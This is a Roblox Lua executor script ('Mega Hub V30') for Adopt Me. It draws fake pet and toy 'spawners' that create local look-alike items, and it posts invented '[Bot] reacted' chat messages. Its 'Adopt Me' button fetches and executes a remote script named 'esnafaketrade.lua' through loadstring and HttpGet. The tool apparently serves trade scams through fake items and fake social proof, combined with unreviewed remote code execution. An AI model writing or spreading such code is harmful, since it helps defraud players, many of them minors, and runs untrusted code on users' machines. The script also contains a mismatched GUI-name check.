-- [[ MEGA HUB V30: COLOR-CODED SELECTION TEXT ]] --
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LP = Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")

if CoreGui:FindFirstChild("MegaHubV30") then CoreGui.MegaHubV29:Destroy() end
local ScreenGui = Instance.new("ScreenGui", CoreGui)
ScreenGui.Name = "MegaHubV30"
ScreenGui.ResetOnSpawn = false

-- --- BOT REACTION SYSTEM ---
local function BotReact(emoji)
    local BotNames = {"SurenArmen", "Aura_Dev", "Gus_Leaker", "AdoptMeFan"}
    StarterGui:SetCore("ChatMakeSystemMessage", {
        Text = "[Bot] " .. BotNames[math.random(1, #BotNames)] .. " reacted: " .. emoji;
        Color = Color3.fromRGB(255, 255, 255);
        Font = Enum.Font.GothamBold;
    })
end

-- --- PET SPAWNER WINDOW ---
local PetWin = Instance.new("Frame", ScreenGui)
PetWin.Size = UDim2.new(0, 380, 0, 340) PetWin.Position = UDim2.new(0.6, 0, 0.3, 0)
PetWin.BackgroundColor3 = Color3.fromRGB(35, 38, 47) PetWin.BorderSizePixel = 2
PetWin.BorderColor3 = Color3.fromRGB(0, 255, 200) PetWin.Visible = false PetWin.Active = true PetWin.Draggable = true
Instance.new("UICorner", PetWin)

local PStatus = Instance.new("TextLabel", PetWin)
PStatus.Size = UDim2.new(1, 0, 0, 30) PStatus.Position = UDim2.new(0, 0, 0.88, 0)
PStatus.Text = "Waiting for selection..." PStatus.TextColor3 = Color3.new(1, 1, 1)
PStatus.BackgroundTransparency = 1 PStatus.TextSize = 14 PStatus.Font = "GothamBold"

local PInput = Instance.new("TextBox", PetWin)
PInput.Size = UDim2.new(0.9, 0, 0, 40) PInput.Position = UDim2.new(0.05, 0, 0.15, 0)
PInput.PlaceholderText = "Enter Pet Name" PInput.BackgroundColor3 = Color3.fromRGB(45, 47, 52)
PInput.TextColor3 = Color3.new(1,1,1) Instance.new("UICorner", PInput)

-- COLOR MAP
local Colors = {
    F = Color3.new(0, 0.6, 1),   -- Blue
    R = Color3.new(1, 0, 0.6),   -- Pink
    N = Color3.new(0, 1, 0.4),   -- Neon Green
    M = Color3.new(0.6, 1, 0)    -- Mega Green
}

-- PET TOGGLES LOGIC
local Selected = {F = false, R = false, N = false, M = false}
local PBtns = {}

local function UpdatePetStatus(lastColor)
    local s = ""
    if Selected.M then s = "M" elseif Selected.N then s = "N" end
    if Selected.F then s = s .. "F" end
    if Selected.R then s = s .. "R" end
    
    local finalMode = s == "" and "Normal" or s
    PStatus.Text = "You have selected: " .. finalMode
    
    -- Set text color to match the last button pressed
    if lastColor then
        PStatus.TextColor3 = lastColor
    elseif s == "" then
        PStatus.TextColor3 = Color3.new(1, 1, 1)
    end
    
    return finalMode
end

local pfrnm = Instance.new("Frame", PetWin)
pfrnm.Size = UDim2.new(0.9, 0, 0, 40) pfrnm.Position = UDim2.new(0.05, 0, 0.35, 0) pfrnm.BackgroundTransparency = 1
Instance.new("UIListLayout", pfrnm).FillDirection = "Horizontal"

local function CreatePToggle(t, c)
    local b = Instance.new("TextButton", pfrnm)
    b.Size = UDim2.new(0.25, -5, 1, 0) b.Text = t b.TextColor3 = Color3.new(1,1,1)
    b.BackgroundColor3 = Color3.fromRGB(30, 30, 30) b.BorderColor3 = c b.BorderSizePixel = 2
    PBtns[t] = b
    b.MouseButton1Click:Connect(function()
        Selected[t] = not Selected[t]
        if t == "M" and Selected.M then Selected.N = false end
        if t == "N" and Selected.N then Selected.M = false end
        for txt, btn in pairs(PBtns) do 
            btn.BackgroundColor3 = Selected[txt] and Color3.fromRGB(80, 80, 80) or Color3.fromRGB(30, 30, 30) 
        end
        UpdatePetStatus(c) -- Pass the button color to the status text
    end)
end

CreatePToggle("F", Colors.F) CreatePToggle("R", Colors.R) 
CreatePToggle("N", Colors.N) CreatePToggle("M", Colors.M)

local PSpawn = Instance.new("TextButton", PetWin)
PSpawn.Size = UDim2.new(0.9, 0, 0, 40) PSpawn.Position = UDim2.new(0.05, 0, 0.75, 0)
PSpawn.Text = "Spawn Pet" PSpawn.BackgroundColor3 = Color3.fromRGB(0, 100, 200) PSpawn.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", PSpawn)
PSpawn.MouseButton1Click:Connect(function()
    PStatus.Text = "Successfully spawned pet!"
    PStatus.TextColor3 = Color3.new(0, 1, 0) -- Success Green
    local fake = Instance.new("Tool", LP.Backpack)
    local mode = UpdatePetStatus()
    fake.Name = (mode == "Normal" and "" or mode.." ") .. PInput.Text
end)

-- --- TOY SPAWNER WINDOW ---
local ToyWin = Instance.new("Frame", ScreenGui)
ToyWin.Size = UDim2.new(0, 380, 0, 220) ToyWin.Position = UDim2.new(0.6, 0, 0.4, 0)
ToyWin.BackgroundColor3 = Color3.fromRGB(35, 38, 47) ToyWin.BorderSizePixel = 2
ToyWin.BorderColor3 = Color3.fromRGB(0, 255, 200) ToyWin.Visible = false ToyWin.Active = true ToyWin.Draggable = true
Instance.new("UICorner", ToyWin)

local TStatus = Instance.new("TextLabel", ToyWin)
TStatus.Size = UDim2.new(1, 0, 0, 20) TStatus.Position = UDim2.new(0, 0, 0.85, 0)
TStatus.Text = "Waiting for toy input..." TStatus.TextColor3 = Color3.new(1, 0.5, 0)
TStatus.BackgroundTransparency = 1 TStatus.TextSize = 14 TStatus.Font = "GothamBold"

local TInput = Instance.new("TextBox", ToyWin)
TInput.Size = UDim2.new(0.9, 0, 0, 40) TInput.Position = UDim2.new(0.05, 0, 0.25, 0)
TInput.PlaceholderText = "Enter Toy Name" TInput.BackgroundColor3 = Color3.fromRGB(45, 47, 52)
TInput.TextColor3 = Color3.new(1,1,1) Instance.new("UICorner", TInput)

local TSpawn = Instance.new("TextButton", ToyWin)
TSpawn.Size = UDim2.new(0.9, 0, 0, 40) TSpawn.Position = UDim2.new(0.05, 0, 0.6, 0)
TSpawn.Text = "Spawn Toy" TSpawn.BackgroundColor3 = Color3.fromRGB(200, 100, 0) TSpawn.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", TSpawn)
TSpawn.MouseButton1Click:Connect(function()
    TStatus.Text = "Successfully spawned toy!"
    TStatus.TextColor3 = Color3.new(0, 1, 0)
    local fake = Instance.new("Tool", LP.Backpack)
    fake.Name = "[TOY] " .. TInput.Text
end)

-- --- MAIN HUB ---
local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 520, 0, 380) Main.Position = UDim2.new(0.5, -260, 0.2, 0)
Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25) Main.Draggable = true Main.Active = true
Instance.new("UICorner", Main)

local Side = Instance.new("Frame", Main)
Side.Size = UDim2.new(0, 150, 1, -40) Side.Position = UDim2.new(0, 0, 0, 40)
Side.BackgroundColor3 = Color3.fromRGB(20, 20, 20) Instance.new("UICorner", Side)
local SideLayout = Instance.new("UIListLayout", Side) SideLayout.Padding = UDim.new(0, 5)

local function Nav(txt, icon, func)
    local b = Instance.new("TextButton", Side)
    b.Size = UDim2.new(1, 0, 0, 45) b.Text = "  " .. icon .. " " .. txt
    b.TextColor3 = Color3.new(1,1,1) b.BackgroundTransparency = 1
    b.TextXAlignment = Enum.TextXAlignment.Left
    b.MouseButton1Click:Connect(func)
end

Nav("Adopt Me", "🐾", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/xxyourfuckasssoulxxilly/daisyscripts/refs/heads/main/esnafaketrade.lua"))() end)
Nav("Pet Spawner", "🎁", function() PetWin.Visible = not PetWin.Visible ToyWin.Visible = false end)
Nav("Toy Spawner", "🧸", function() ToyWin.Visible = not ToyWin.Visible PetWin.Visible = false end)
Nav("Misc", "⚙️", function() end)

-- --- EMOJI BAR ---
local EBar = Instance.new("Frame", ScreenGui)
EBar.Size = UDim2.new(0, 340, 0, 45) EBar.Position = UDim2.new(0.5, -170, 0.85, 0)
EBar.BackgroundColor3 = Color3.new(1,1,1) Instance.new("UICorner", EBar) EBar.Draggable = true
local eL = Instance.new("UIListLayout", EBar) eL.FillDirection = "Horizontal" eL.HorizontalAlignment = "Center" eL.VerticalAlignment = "Center" eL.Padding = UDim.new(0, 12)
for _, e in pairs({"👍", "😲", "💯", "👀", "🔥", "❤️", "🎉"}) do
    local b = Instance.new("TextButton", EBar)
    b.Size = UDim2.new(0, 32, 0, 32) b.Text = e b.TextSize = 25 b.BackgroundTransparency = 1
    b.MouseButton1Click:Connect(function() BotReact(e) end)
end
